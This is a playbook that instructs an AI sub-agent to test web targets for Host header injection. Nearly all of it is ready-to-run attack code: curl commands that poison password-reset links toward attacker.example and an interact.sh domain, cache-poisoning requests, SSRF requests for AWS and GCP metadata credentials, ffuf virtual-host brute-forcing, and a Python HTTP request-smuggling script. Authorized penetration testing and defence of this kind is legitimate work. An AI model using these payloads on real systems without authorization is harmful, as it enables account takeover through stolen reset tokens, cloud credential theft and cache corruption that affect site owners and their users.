# Testing for Host header injection

> OSS port of mukul975's `testing-for-host-header-injection`. The original already names interact.sh as the Collaborator substitute; this version makes OSS (curl, interact.sh, ffuf, mitmproxy) the primary path throughout.

## Sub-agent mission

You are dispatched to test for HTTP Host header injection on a target. You probe for password-reset poisoning, web cache poisoning, SSRF via Host, virtual-host bypass, and HTTP request smuggling. You drive curl, interact.sh, ffuf, and (for raw-socket work) mitmproxy or a small Python script. Report findings with severity, evidence, and the matching defensive plugin.

## Inputs

- **task:** the user's verbatim request (e.g. "our password-reset email — can it be poisoned via the Host header?").
- **target / scope:** base URL + in-scope hosts/origins. Confirmed by the orchestrator's gate.
- **ack_state:** `confirmed` for live-target; `n/a` for static code review of Host-header handling.
- **context (optional):** framework, password-reset flow details, CDN/cache layer.

## Tools

```bash
# Install (documentation only)
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
brew install ffuf mitmproxy
```

For the paid→OSS swap table (Burp Collaborator → interact.sh, param-miner → ffuf), `SEE: references/oss-tool-map.md`.

## Methodology

### Step 1 — Basic Host header injection

Send a request with a tampered Host header and observe the response:

```bash
# Replace Host with an attacker-controlled value
curl -sk -H "Host: attacker.example" \
     -o /dev/null -w "%{http_code} size:%{size_download}\n" \
     https://TARGET/

# Host header with absolute-URL request line (some servers trust this)
curl -sk https://TARGET/ -H "Host: attacker.example"
curl -sk "https://TARGET/" -H "Host: TARGET" --request-target "https://attacker.example/"
```

Check whether the response body, links, or any field reflects the attacker Host.

### Step 2 — Password-reset poisoning

If the target sends password-reset emails with a link derived from the Host header:

```bash
# Trigger a reset to your own account, with a poisoned Host
curl -sk -X POST https://TARGET/password-reset \
     -H "Host: attacker.example" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     --data "email=victim@example.com"
```

Inspect the reset link received (or have the recipient forward it). If the link points to `attacker.example`, the reset token leaks to the attacker. **Confirm out-of-band** with interact.sh:

```bash
interactsh-client >& interactsh.log &
DOMAIN=$(grep -oE '[a-zA-Z0-9.-]+\.oast\.(pro|live|site|fun|me)' interactsh.log | head -1)
curl -sk -X POST https://TARGET/password-reset \
     -H "Host: $DOMAIN" \
     --data "email=victim@example.com"
# A hit on interact.sh from the victim's email client confirms the poisoning
```

### Step 3 — Web cache poisoning via Host

CDN caches are often keyed on path but not Host. Poison the cache:

```bash
# Identify unkeyed headers (replaces Burp param-miner)
ffuf -u https://TARGET/ \
     -w ~/SecLists/Discovery/Web-Content/headers.txt \
     -H "FUZZ: attacker.example" \
     -mr "attacker" \
     -t 20

# Poison a cached resource
curl -sk -H "Host: attacker.example" \
     -o /dev/null -w "%{http_code}\n" \
     "https://TARGET/static/app.js"
# Then fetch from a different client (different IP) — if you see attacker content, the cache is poisoned
```

### Step 4 — SSRF via Host (cloud metadata)

> ⚠️ **These are live-target payloads. The authorization gate (Track B) must have fired for `TARGET` before running any of these. Do not paste-and-run without an active, in-scope ack.**

Some backends proxy internal requests based on the Host header. Pivot to cloud metadata:

```bash
# AWS IMDSv1 (169.254.169.254)
curl -sk -H "Host: 169.254.169.254" \
     "http://TARGET/latest/meta-data/iam/security-credentials/"
# GCP metadata
curl -sk -H "Host: metadata.google.internal" \
     -H "Metadata-Flavor: Google" \
     "http://TARGET/computeMetadata/v1/"
```

Confirm SSRF to interact.sh first to avoid noisy failed metadata calls in logs.

### Step 5 — Virtual host enumeration

Discover hidden virtual hosts (vhost routing bypass):

```bash
# Brute vhosts (replaces gobuster vhost)
ffuf -u https://TARGET/ \
     -H "Host: FUZZ.TARGET" \
     -w ~/SecLists/Discovery/DNS/subdomains-top1million-20000.txt \
     -fs <size-of-default-response> \
     -t 50

# Also try absolute vhosts
ffuf -u https://TARGET/ \
     -H "Host: FUZZ" \
     -w ~/SecLists/Discovery/DNS/best-dns-wordlist.txt \
     -fs <default-size>
```

A response that materially differs (different content-length, status, or body) from the default signals a vhost route exists.

### Step 6 — Connection-state attacks (HTTP request smuggling)

> ⚠️ **These are live-target payloads. The authorization gate (Track B) must have fired for `TARGET` before running any of these. Do not paste-and-run without an active, in-scope ack.**

> Tricky without Burp Repeater's raw socket control. Use mitmproxy with raw socket mode, or a small Python `socket` script.

```python
# smuggle-test.py — minimal HTTP/1.1 CL.TE smuggling probe
import socket, sys

host, port = "TARGET", 443
payload = (
    "POST / HTTP/1.1\r\n"
    "Host: TARGET\r\n"
    "Content-Length: 13\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "SMUGGLED=YES"
)
s = socket.create_connection((host, port))
try:
    # Wrap in TLS for https targets
    import ssl
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    s = ctx.wrap_socket(s, server_hostname=host)
    s.sendall(payload.encode())
    print(s.recv(4096).decode(errors="replace"))
finally:
    s.close()
```

The "SMUGGLED" prefix appearing on another user's response confirms smuggling.

## Common mistakes

- **Only testing `Host: attacker.com` literally.** Try `Host:`, empty Host, doubled Host (`Host: target\r\nHost: attacker`), `X-Forwarded-Host`, and absolute-URL request lines. Backends differ on which one they trust.
- **Forgetting `X-Forwarded-Host`.** Many frameworks honor `X-Forwarded-Host` ahead of `Host`. Always test both.
- **Ignoring cache state.** A cache-poisoning test must run from a second client to confirm the poisoned entry is served globally.
- **Reporting without OOB confirmation.** A `Location: attacker.com` in the response is not always exploitable. Confirm with interact.sh.
- **Skipping smuggling because "it's hard without Burp".** Use the Python socket approach above — it's only ~15 lines.

## Quick reference — Host-derived attack matrix

| Attack | What to manipulate | Detect with |
|---|---|---|
| Password-reset poisoning | `Host` on reset request | Email link inspection / interact.sh |
| Web cache poisoning | `Host`, `X-Forwarded-Host`, unkeyed headers | Cache hit from a second client |
| SSRF via Host | `Host: 169.254.169.254` | Metadata echo / interact.sh |
| Vhost bypass | `Host: admin.target` | Different response content |
| Request smuggling | `Content-Length` + `Transfer-Encoding` mismatch | Python socket probe |

## OWASP / MITRE references

- **MITRE ATT&CK** — T1190 (Exploit Public-Facing Application), T1059.007 (JavaScript), T1505.003 (Web Shell), T1083 (File and Directory Discovery).

## Legal note

Host header injection testing sends crafted requests that may pollute shared caches or trigger email delivery to third parties. Run only against targets you own or are explicitly authorized to test. The orchestrator's gate fires before this sub-agent dispatches.

## Remediation

`SEE: references/defensive-cross-refs.md`. Typical matches:

- Missing Host validation → `defense-in-depth-validation` (server-side allowlist of permitted Host values).
- Cache poisoning exposure → `security-headers-configuration` (cache-control + keyed headers).
- SSRF exposure → `defense-in-depth-validation` (egress allowlist).

## Sub-agent return contract

```json
{
  "findings": [
    {
      "vuln": "Password-reset poisoning via Host header",
      "severity": "high | critical",
      "evidence": "POST /password-reset with Host: <interact.sh-domain> produced a reset email linking to the attacker domain (confirmed via OOB hit).",
      "owasp": "A01:2021",
      "mitre": ["T1190"],
      "remediation": "Derive reset URLs from a server-side configured base URL, not the request Host. Reject requests whose Host is not on the allowlist.",
      "defensive_plugin": "defense-in-depth-validation"
    }
  ],
  "vhosts_discovered": ["admin.TARGET", "staging.TARGET"],
  "summary": "1 critical Host-header finding (reset poisoning), 2 hidden vhosts discovered."
}
```
